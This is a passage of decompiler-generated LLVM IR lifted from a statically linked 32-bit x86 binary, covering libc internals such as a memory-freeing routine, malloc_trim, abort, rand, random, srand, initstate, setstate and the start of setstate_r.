  %v1_80507fe = and i32 %v3_80507cc, -4
  store i32 %v1_80507fe, i32* @ebp, align 4
  %v1_8050801 = load i32, i32* @global_var_805ba4c.119, align 4
  %v12_8050801 = icmp eq i32 %v1_805080d, %v1_8050801
  br i1 %v12_8050801, label %dec_label_pc_805085b, label %dec_label_pc_8050809

dec_label_pc_8050809:                             ; preds = %dec_label_pc_80507fa
  %v2_8050809 = add i32 %v1_805080d, 4
  %v3_8050809 = add i32 %v2_8050809, %v1_80507fe
  %v4_8050809 = inttoptr i32 %v3_8050809 to i32*
  %v5_8050809 = load i32, i32* %v4_8050809, align 4
  store i32 %v5_8050809, i32* %eax.global-to-local, align 4
  %v3_805080d = inttoptr i32 %v2_8050809 to i32*
  store i32 %v1_80507fe, i32* %v3_805080d, align 4
  %v0_8050810 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050810 = urem i32 %v0_8050810, 2
  %v2_8050810 = icmp eq i32 %v1_8050810, 0
  store i32 %v1_8050810, i32* %eax.global-to-local, align 4
  %v1_8050815 = icmp eq i1 %v2_8050810, false
  br i1 %v1_8050815, label %dec_label_pc_8050836, label %dec_label_pc_8050817

dec_label_pc_8050817:                             ; preds = %dec_label_pc_8050809
  %v0_8050817 = load i32, i32* @esi, align 4
  %v1_8050817 = add i32 %v0_8050817, 8
  %v2_8050817 = inttoptr i32 %v1_8050817 to i32*
  %v3_8050817 = load i32, i32* %v2_8050817, align 4
  store i32 %v3_8050817, i32* @edx, align 4
  %v1_805081a = add i32 %v0_8050817, 12
  %v2_805081a = inttoptr i32 %v1_805081a to i32*
  %v3_805081a = load i32, i32* %v2_805081a, align 4
  store i32 %v3_805081a, i32* %eax.global-to-local, align 4
  %v1_805081d = add i32 %v3_8050817, 12
  %v2_805081d = inttoptr i32 %v1_805081d to i32*
  %v3_805081d = load i32, i32* %v2_805081d, align 4
  store i32 %v3_805081d, i32* @edi, align 4
  %v12_8050820 = icmp eq i32 %v3_805081d, %v0_8050817
  %v1_8050822 = icmp eq i1 %v12_8050820, false
  br i1 %v1_8050822, label %dec_label_pc_8050829, label %dec_label_pc_8050824

dec_label_pc_8050824:                             ; preds = %dec_label_pc_8050817
  %v1_8050824 = add i32 %v3_805081a, 8
  %v2_8050824 = inttoptr i32 %v1_8050824 to i32*
  %v3_8050824 = load i32, i32* %v2_8050824, align 4
  %v15_8050824 = icmp eq i32 %v3_8050824, %v3_805081d
  br i1 %v15_8050824, label %dec_label_pc_805082e, label %dec_label_pc_8050829

dec_label_pc_8050829:                             ; preds = %dec_label_pc_8050824, %dec_label_pc_8050817, %dec_label_pc_80507ed, %dec_label_pc_80507d9
  %v0_8050829 = call i32 @abort()
  store i32 %v0_8050829, i32* %eax.global-to-local, align 4
  %v1_805082e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805082e

dec_label_pc_805082e:                             ; preds = %dec_label_pc_8050824, %dec_label_pc_8050829
  %v1_805082e = phi i32 [ %v3_8050817, %dec_label_pc_8050824 ], [ %v1_805082e.pre, %dec_label_pc_8050829 ]
  %v0_805082e = phi i32 [ %v3_805081a, %dec_label_pc_8050824 ], [ %v0_8050829, %dec_label_pc_8050829 ]
  %v2_805082e = add i32 %v1_805082e, 12
  %v3_805082e = inttoptr i32 %v2_805082e to i32*
  store i32 %v0_805082e, i32* %v3_805082e, align 4
  %v0_8050831 = load i32, i32* @ebx, align 4
  %v1_8050831 = load i32, i32* @ebp, align 4
  %v2_8050831 = add i32 %v1_8050831, %v0_8050831
  store i32 %v2_8050831, i32* @ebx, align 4
  %v0_8050833 = load i32, i32* @edx, align 4
  %v1_8050833 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050833 = add i32 %v1_8050833, 8
  %v3_8050833 = inttoptr i32 %v2_8050833 to i32*
  store i32 %v0_8050833, i32* %v3_8050833, align 4
  br label %dec_label_pc_8050836

dec_label_pc_8050836:                             ; preds = %dec_label_pc_8050809, %dec_label_pc_805082e
  %v0_8050836 = load i32, i32* @global_var_805ba5c.137, align 4
  store i32 %v0_8050836, i32* %eax.global-to-local, align 4
  %v0_805083b = load i32, i32* @ecx, align 4
  %v1_805083b = add i32 %v0_805083b, 12
  %v2_805083b = inttoptr i32 %v1_805083b to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.121 to i32), i32* %v2_805083b, align 4
  %v0_8050842 = load i32, i32* @ebx, align 4
  %v1_8050842 = load i32, i32* @ecx, align 4
  %v3_8050842 = add i32 %v1_8050842, %v0_8050842
  %v4_8050842 = inttoptr i32 %v3_8050842 to i32*
  store i32 %v0_8050842, i32* %v4_8050842, align 4
  %v0_8050845 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050845 = load i32, i32* @ecx, align 4
  %v2_8050845 = add i32 %v1_8050845, 8
  %v3_8050845 = inttoptr i32 %v2_8050845 to i32*
  store i32 %v0_8050845, i32* %v3_8050845, align 4
  %v0_8050848 = load i32, i32* @ecx, align 4
  %v1_8050848 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050848 = add i32 %v1_8050848, 12
  %v3_8050848 = inttoptr i32 %v2_8050848 to i32*
  store i32 %v0_8050848, i32* %v3_8050848, align 4
  %v0_805084b = load i32, i32* @ebx, align 4
  %v1_805084d = or i32 %v0_805084b, 1
  store i32 %v1_805084d, i32* %eax.global-to-local, align 4
  %v0_8050850 = load i32, i32* @ecx, align 4
  store i32 %v0_8050850, i32* @global_var_805ba5c.137, align 4
  %v2_8050856 = add i32 %v0_8050850, 4
  %v3_8050856 = inttoptr i32 %v2_8050856 to i32*
  store i32 %v1_805084d, i32* %v3_8050856, align 4
  br label %dec_label_pc_805086b

dec_label_pc_805085b:                             ; preds = %dec_label_pc_80507fa
  %v0_805085b = load i32, i32* @ebx, align 4
  %v2_805085b = add i32 %v0_805085b, %v1_80507fe
  store i32 %v2_805085b, i32* @ebx, align 4
  %v1_805085f = or i32 %v2_805085b, 1
  store i32 %v1_805085f, i32* %eax.global-to-local, align 4
  %v1_8050862 = load i32, i32* @ecx, align 4
  %v2_8050862 = add i32 %v1_8050862, 4
  %v3_8050862 = inttoptr i32 %v2_8050862 to i32*
  store i32 %v1_805085f, i32* %v3_8050862, align 4
  %v0_8050865 = load i32, i32* @ecx, align 4
  store i32 %v0_8050865, i32* @global_var_805ba4c.119, align 4
  br label %dec_label_pc_805086b

dec_label_pc_805086b:                             ; preds = %dec_label_pc_8050836, %dec_label_pc_805085b
  %v0_805086b = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_805086b, 131072
  br i1 %tmp, label %dec_label_pc_80508d0, label %dec_label_pc_8050873

dec_label_pc_8050873:                             ; preds = %dec_label_pc_805086b
  %v0_8050873 = load i8, i8* @global_var_805ba20.118, align 32
  %v1_8050873 = and i8 %v0_8050873, 2
  %v2_8050873 = icmp eq i8 %v1_8050873, 0
  br i1 %v2_8050873, label %dec_label_pc_805088c, label %dec_label_pc_805087c

dec_label_pc_805087c:                             ; preds = %dec_label_pc_8050873
  %v2_8050884 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805ba20.118 to i32*))
  store i32 %v2_8050884, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805088c

dec_label_pc_805088c:                             ; preds = %dec_label_pc_8050873, %dec_label_pc_805087c
  %v0_805088c = load i32, i32* @global_var_805ba4c.119, align 4
  store i32 %v0_805088c, i32* %eax.global-to-local, align 4
  %v1_8050891 = add i32 %v0_805088c, 4
  %v2_8050891 = inttoptr i32 %v1_8050891 to i32*
  %v3_8050891 = load i32, i32* %v2_8050891, align 4
  %v1_8050894 = and i32 %v3_8050891, -4
  store i32 %v1_8050894, i32* %eax.global-to-local, align 4
  %v1_8050897 = load i32, i32* @global_var_805bd64.135, align 4
  %v7_8050897 = icmp ult i32 %v1_8050894, %v1_8050897
  br i1 %v7_8050897, label %dec_label_pc_80508d0, label %dec_label_pc_805089f

dec_label_pc_805089f:                             ; preds = %dec_label_pc_805088c
  %v0_805089f = load i32, i32* @global_var_805bd68.133, align 8
  store i32 %v0_805089f, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_805ba20.118 to i32), i32* @edx, align 4
  %v0_80508a9 = call i32 @__malloc_trim()
  store i32 %v0_80508a9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508d0

dec_label_pc_80508b0:                             ; preds = %dec_label_pc_80507b8
  %v2_80508b0 = inttoptr i32 %v1_8050781 to i32*
  %v3_80508b0 = load i32, i32* %v2_80508b0, align 4
  %v0_80508b3 = load i32, i32* @global_var_805bd70.126, align 16
  %v1_80508b3 = add i32 %v0_80508b3, -1
  store i32 %v1_80508b3, i32* @global_var_805bd70.126, align 16
  %v2_80508b9 = add i32 %v3_80508b0, %v1_8050791
  store i32 %v2_80508b9, i32* %eax.global-to-local, align 4
  %v2_80508bc = sub i32 %v1_8050781, %v3_80508b0
  %v0_80508c2 = load i32, i32* @global_var_805bd84.130, align 4
  %v2_80508c2 = sub i32 %v0_80508c2, %v2_80508b9
  store i32 %v2_80508c2, i32* @global_var_805bd84.130, align 4
  %v4_80508c8 = call i32 @munmap(i32 %v2_80508bc, i32 %v2_80508b9, i32 %v1_8050791, i32 %v1_8050791)
  store i32 %v4_80508c8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508d0

dec_label_pc_80508d0:                             ; preds = %dec_label_pc_805088c, %dec_label_pc_805086b, %dec_label_pc_805089f, %dec_label_pc_8050798, %dec_label_pc_80508b0
  store i32 %v2_805076b, i32* @eax, align 4
  %v2_80508d9 = call i32 @__pthread_return_void(i32 %v2_805076b, i32 1)
  store i32 %v2_80508d9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508e1

dec_label_pc_80508e1:                             ; preds = %entry, %dec_label_pc_80508d0
  %.0 = phi i32 [ undef, %entry ], [ %v2_80508d9, %dec_label_pc_80508d0 ]
  store i32 %v0_8050750, i32* @ebx, align 4
  store i32 %v0_805074f, i32* @esi, align 4
  store i32 %v0_805074e, i32* @edi, align 4
  store i32 %v0_805074d, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80508b0, { 1, 0 }
  uselistorder i32 %v0_8050842, { 1, 0 }
  uselistorder i32 %v1_8050810, { 1, 0 }
  uselistorder i32 %v2_8050809, { 1, 0 }
  uselistorder i32 %v1_80507fe, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805080d, { 1, 0 }
  uselistorder i32 %v1_8050791, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8050789, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050781, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_805ba20.118 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805ba54.121 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805ba4c.119, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_80508e1, { 1, 0 }
  uselistorder label %dec_label_pc_80508d0, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805088c, { 1, 0 }
  uselistorder label %dec_label_pc_805086b, { 1, 0 }
  uselistorder label %dec_label_pc_8050836, { 1, 0 }
  uselistorder label %dec_label_pc_805082e, { 1, 0 }
  uselistorder label %dec_label_pc_80507fa, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80508e9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80508f6 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_805ba20.118 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_805ba20.118 to i32), i32* @edx, align 4
  %v0_8050903 = load i32, i32* @ebx, align 4
  store i32 %v0_8050903, i32* @eax, align 4
  store i32 %v0_80508e9, i32* @ebx, align 4
  %v0_8050906 = call i32 @__malloc_trim()
  ret i32 %v0_8050906

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_805ba20.118 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_805ba20.118, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8050918 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80557e8.138 to i32))
  %v12_8050922 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050927

dec_label_pc_8050927:                             ; preds = %dec_label_pc_8050927.dec_label_pc_8050927_crit_edge, %entry
  %v0_8050927 = phi i32 [ %v12_8050922, %entry ], [ %v0_8050927.pre, %dec_label_pc_8050927.dec_label_pc_8050927_crit_edge ]
  %v1_805093219 = phi i32 [ 31, %entry ], [ %v1_8050932, %dec_label_pc_8050927.dec_label_pc_8050927_crit_edge ]
  %v2_8050927 = mul i32 %v1_805093219, 4
  %v3_8050927 = add i32 %v2_8050927, 152
  %v4_8050927 = add i32 %v3_8050927, %v0_8050927
  %v5_8050927 = inttoptr i32 %v4_8050927 to i32*
  store i32 0, i32* %v5_8050927, align 4
  %v0_8050932.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050932 = add i32 %v0_8050932.pre, -1
  %v9_8050932 = icmp slt i32 %v1_8050932, 0
  store i32 %v1_8050932, i32* %eax.global-to-local, align 4
  %v1_8050933 = icmp eq i1 %v9_8050932, false
  br i1 %v1_8050933, label %dec_label_pc_8050927.dec_label_pc_8050927_crit_edge, label %dec_label_pc_8050935

dec_label_pc_8050927.dec_label_pc_8050927_crit_edge: ; preds = %dec_label_pc_8050927
  %v0_8050927.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050927

dec_label_pc_8050935:                             ; preds = %dec_label_pc_8050927
  %v0_8050935 = load i32, i32* @ebx, align 4
  %v2_8050939 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8050939, i32* @ebx, align 4
  %v4_8050941 = call i32 @__sigaddset(i32 %v2_8050939, i32 6, i32 %v0_8050935, i32 %v0_8050935)
  store i32 %v4_8050941, i32* %eax.global-to-local, align 4
  %v1_8050949 = icmp eq i32 %v4_8050941, 0
  %v1_805094b = icmp eq i1 %v1_8050949, false
  br i1 %v1_805094b, label %dec_label_pc_805095b, label %dec_label_pc_805094d

dec_label_pc_805094d:                             ; preds = %dec_label_pc_8050935
  %v3_8050953 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8050953 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8050953, i32 0)
  store i32 %v4_8050953, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805095b

dec_label_pc_805095b:                             ; preds = %dec_label_pc_8050935, %dec_label_pc_805094d
  %v2_80509934 = phi i32 [ %v4_8050941, %dec_label_pc_8050935 ], [ %v4_8050953, %dec_label_pc_805094d ]
  %v0_805095b = load i8, i8* @global_var_805b954.139, align 4
  %v1_805095b = icmp eq i8 %v0_805095b, 0
  %v1_8050962 = icmp eq i1 %v1_805095b, false
  br i1 %v1_8050962, label %dec_label_pc_8050993, label %dec_label_pc_8050964

dec_label_pc_8050964:                             ; preds = %dec_label_pc_805095b
  store i8 1, i8* @global_var_805b954.139, align 4
  br label %dec_label_pc_805096b

dec_label_pc_805096b:                             ; preds = %dec_label_pc_80509d2, %dec_label_pc_8050964
  %v1_8050973 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80557e8.138 to i32))
  store i32 %v1_8050973, i32* %eax.global-to-local, align 4
  %v1_805097f = call i32 @__raise(i32 6)
  store i32 %v1_805097f, i32* %eax.global-to-local, align 4
  %v1_805098b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80557e8.138 to i32))
  store i32 %v1_805098b, i32* %eax.global-to-local, align 4
  %v0_8050993.pre = load i8, i8* @global_var_805b954.139, align 4
  br label %dec_label_pc_8050993

dec_label_pc_8050993:                             ; preds = %dec_label_pc_805095b, %dec_label_pc_805096b
  %v2_8050993 = phi i32 [ %v2_80509934, %dec_label_pc_805095b ], [ %v1_805098b, %dec_label_pc_805096b ]
  %v0_8050993 = phi i8 [ %v0_805095b, %dec_label_pc_805095b ], [ %v0_8050993.pre, %dec_label_pc_805096b ]
  %v1_8050993 = zext i8 %v0_8050993 to i32
  %v3_8050993 = and i32 %v2_8050993, -256
  %v4_8050993 = or i32 %v1_8050993, %v3_8050993
  store i32 %v4_8050993, i32* %eax.global-to-local, align 4
  %v10_8050998 = icmp eq i8 %v0_8050993, 1
  %v1_805099a = icmp eq i1 %v10_8050998, false
  br i1 %v1_805099a, label %dec_label_pc_80509f4, label %dec_label_pc_805099c

dec_label_pc_805099c:                             ; preds = %dec_label_pc_8050993
  %v2_80509a4 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80509a4, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_805b954.139, align 4
  %v3_80509b0 = bitcast i32* %stack_var_-272 to i8*
  %v4_80509b0 = call i32 @__GI_memset(i8* %v3_80509b0, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80509c7

dec_label_pc_80509c7:                             ; preds = %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge, %dec_label_pc_805099c
  %v0_80509c7 = phi i32 [ %v12_8050922, %dec_label_pc_805099c ], [ %v0_80509c7.pre, %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge ]
  %v1_80509cf18 = phi i32 [ 31, %dec_label_pc_805099c ], [ %v1_80509cf, %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge ]
  %v2_80509c7 = mul i32 %v1_80509cf18, 4
  %v3_80509c7 = add i32 %v2_80509c7, 16
  %v4_80509c7 = add i32 %v3_80509c7, %v0_80509c7
  %v5_80509c7 = inttoptr i32 %v4_80509c7 to i32*
  store i32 -1, i32* %v5_80509c7, align 4
  %v0_80509cf.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80509cf = add i32 %v0_80509cf.pre, -1
  %v9_80509cf = icmp slt i32 %v1_80509cf, 0
  store i32 %v1_80509cf, i32* %eax.global-to-local, align 4
  %v1_80509d0 = icmp eq i1 %v9_80509cf, false
  br i1 %v1_80509d0, label %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge, label %dec_label_pc_80509d2

dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge: ; preds = %dec_label_pc_80509c7
  %v0_80509c7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80509c7

dec_label_pc_80509d2:                             ; preds = %dec_label_pc_80509c7
  store i32 %v2_80509a4, i32* %eax.global-to-local, align 4
  %v4_80509e7 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_80509e7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805096b

dec_label_pc_80509f4:                             ; preds = %dec_label_pc_8050993
  %v10_80509f4 = icmp eq i8 %v0_8050993, 2
  %v1_80509f6 = icmp eq i1 %v10_80509f4, false
  br i1 %v1_80509f6, label %dec_label_pc_8050a00, label %dec_label_pc_80509f8

dec_label_pc_80509f8:                             ; preds = %dec_label_pc_80509f4
  store i8 3, i8* @global_var_805b954.139, align 4
  br label %dec_label_pc_8050a00

dec_label_pc_8050a00:                             ; preds = %dec_label_pc_80509f4, %dec_label_pc_80509f8
  %v0_8050a00 = phi i8 [ %v0_8050993, %dec_label_pc_80509f4 ], [ 3, %dec_label_pc_80509f8 ]
  %v9_8050a00 = icmp eq i8 %v0_8050a00, 3
  %v1_8050a07 = icmp eq i1 %v9_8050a00, false
  br i1 %v1_8050a07, label %dec_label_pc_8050a1a, label %dec_label_pc_8050a09

dec_label_pc_8050a09:                             ; preds = %dec_label_pc_8050a00
  store i8 4, i8* @global_var_805b954.139, align 4
  %v1_8050a15 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8050a1a:                             ; preds = %dec_label_pc_8050a00, %dec_label_pc_8050a1a
  br label %dec_label_pc_8050a1a

; uselistorder directives
  uselistorder i32 %v1_80509cf, { 2, 1, 0 }
  uselistorder i8 %v0_8050993, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8050932, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 14, 11, 13, 12, 1 }
  uselistorder i8 4, { 4, 2, 3, 1, 0 }
  uselistorder i8 3, { 0, 3, 6, 5, 1, 4, 2 }
  uselistorder i8* @global_var_805b954.139, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8050a1a, { 1, 0 }
  uselistorder label %dec_label_pc_8050a00, { 1, 0 }
  uselistorder label %dec_label_pc_8050993, { 1, 0 }
  uselistorder label %dec_label_pc_805095b, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8050a20 = call i32 @random()
  ret i32 %v0_8050a20

; uselistorder directives
  uselistorder i32 ()* @random, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050a28 = load i32, i32* @ebx, align 4
  store i32 %v0_8050a28, i32* %stack_var_-4, align 4
  %v2_8050a36 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050a36, i32* @ebx, align 4
  %v2_8050a3b = call i32 @__pthread_return_void(i32 %v2_8050a36, i32 134550239)
  %v1_8050a47 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055800.140 to i32))
  %v2_8050a4e = ptrtoint i32* %stack_var_-8 to i32
  %v3_8050a58 = call i32 @__GI_random_r(i32* nonnull @global_var_8055818, i32 %v2_8050a4e)
  store i32 ptrtoint (i32* @global_var_8055818 to i32), i32* @eax, align 4
  %v2_8050a62 = call i32 @__pthread_return_void(i32 %v2_8050a36, i32 1)
  %v3_8050a67 = load i32, i32* %stack_var_-8, align 4
  %v2_8050a6e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050a6e, i32* @ebx, align 4
  ret i32 %v3_8050a67
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8050a81 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050a81, i32* @eax, align 4
  %v2_8050a86 = call i32 @__pthread_return_void(i32 %v2_8050a81, i32 134550239)
  %v1_8050a92 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055800.140 to i32))
  %v0_8050a97 = load i32, i32* bitcast (i32** @global_var_8055820.143 to i32*), align 32
  store i32 %v0_8050a97, i32* @ebx, align 4
  %v3_8050aa8 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8055818)
  %v2_8050ab0 = icmp slt i32 %v3_8050aa8, 0
  br i1 %v2_8050ab0, label %dec_label_pc_8050ab7, label %dec_label_pc_8050ab4

dec_label_pc_8050ab4:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805581c.144 to i32), i32* @esi, align 4
  br label %dec_label_pc_8050ab7

dec_label_pc_8050ab7:                             ; preds = %entry, %dec_label_pc_8050ab4
  store i32 %v2_8050a81, i32* @eax, align 4
  %v2_8050ac0 = call i32 @__pthread_return_void(i32 %v2_8050a81, i32 1)
  %v0_8050ac8 = load i32, i32* @esi, align 4
  ret i32 %v0_8050ac8

; uselistorder directives
  uselistorder label %dec_label_pc_8050ab7, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8050adc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050adc, i32* @ebx, align 4
  %v2_8050ae1 = call i32 @__pthread_return_void(i32 %v2_8050adc, i32 134550239)
  %v1_8050aed = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055800.140 to i32))
  store i32 ptrtoint (i32** @global_var_805581c.144 to i32), i32* @esi, align 4
  %v4_8050b0c = inttoptr i32 %arg2 to i32*
  %v5_8050b0c = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8050b0c, i32 %arg3, i32 ptrtoint (i32* @global_var_8055818 to i32))
  store i32 %v5_8050b0c, i32* @eax, align 4
  %v2_8050b17 = call i32 @__pthread_return_void(i32 %v2_8050adc, i32 1)
  %v0_8050b1f = load i32, i32* @esi, align 4
  ret i32 %v0_8050b1f
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050b24 = load i32, i32* @ebx, align 4
  store i32 %v0_8050b24, i32* %stack_var_-4, align 4
  %v2_8050b32 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8050b32, i32* @ebx, align 4
  %v2_8050b37 = call i32 @__pthread_return_void(i32 %v2_8050b32, i32 134550239)
  %v1_8050b43 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055800.140 to i32))
  %v3_8050b53 = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_8055818)
  store i32 ptrtoint (i32* @global_var_8055818 to i32), i32* @eax, align 4
  %v2_8050b5d = call i32 @__pthread_return_void(i32 %v2_8050b32, i32 1)
  %v2_8050b65 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050b65, i32* @ebx, align 4
  ret i32 %v2_8050b5d

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8055818 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_8055818, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_8050b6b = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_8050b77 = add i32 %tmp3, 12
  %v2_8050b77 = inttoptr i32 %v1_8050b77 to i32*
  %v3_8050b77 = load i32, i32* %v2_8050b77, align 4
  store i32 %v3_8050b77, i32* %ecx.global-to-local, align 4
  %v1_8050b7a = add i32 %arg1, 4
  store i32 %v1_8050b7a, i32* %esi.global-to-local, align 4
  %v1_8050b7d = add i32 %tmp3, 8
  %v2_8050b7d = inttoptr i32 %v1_8050b7d to i32*
  %v3_8050b7d = load i32, i32* %v2_8050b7d, align 4
  %v1_8050b80 = icmp eq i32 %v3_8050b77, 0
  %v1_8050b82 = icmp eq i1 %v1_8050b80, false
  br i1 %v1_8050b82, label %dec_label_pc_8050b8d, label %dec_label_pc_8050b84

dec_label_pc_8050b84:                             ; preds = %entry
  %v1_8050b84 = add i32 %v3_8050b7d, -4
  %v2_8050b84 = inttoptr i32 %v1_8050b84 to i32*
  store i32 0, i32* %v2_8050b84, align 4
  br label %dec_label_pc_8050b9d

dec_label_pc_8050b8d:                             ; preds = %entry
  %v1_8050b8d = add i32 %tmp3, 4
  %v2_8050b8d = inttoptr i32 %v1_8050b8d to i32*
  %v3_8050b8d = load i32, i32* %v2_8050b8d, align 4
  %v2_8050b90 = sub i32 %v3_8050b8d, %v3_8050b7d
  %v2_8050b92 = sdiv i32 %v2_8050b90, 4
  %v3_8050b95 = mul i32 %v2_8050b92, 5
  %v2_8050b98 = add i32 %v3_8050b95, %v3_8050b77
  store i32 %v2_8050b98, i32* %eax.global-to-local, align 4
  %v2_8050b9a = add i32 %v3_8050b7d, -4
  %v3_8050b9a = inttoptr i32 %v2_8050b9a to i32*
  store i32 %v2_8050b98, i32* %v3_8050b9a, align 4
  br label %dec_label_pc_8050b9d

dec_label_pc_8050b9d:                             ; preds = %dec_label_pc_8050b84, %dec_label_pc_8050b8d
  %v0_8050b9d = load i32, i32* %esi.global-to-local, align 4
  %v1_8050b9d = add i32 %v0_8050b9d, -4
  %v2_8050b9d = inttoptr i32 %v1_8050b9d to i32*
  %v3_8050b9d = load i32, i32* %v2_8050b9d, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8050ba5 = ashr i32 %v3_8050b9d, 31
  %v2_8050ba6 = zext i32 %v3_8050b9d to i64
  %v4_8050ba6 = zext i32 %v1_8050ba5 to i64
  %v5_8050ba6 = mul nuw i64 %v4_8050ba6, 4294967296
  %v6_8050ba6 = or i64 %v5_8050ba6, %v2_8050ba6
  %v8_8050ba6 = sdiv i64 %v6_8050ba6, 5
  %v9_8050ba6 = trunc i64 %v8_8050ba6 to i32
  store i32 %v9_8050ba6, i32* %eax.global-to-local, align 4
  %v10_8050ba6 = srem i64 %v6_8050ba6, 5
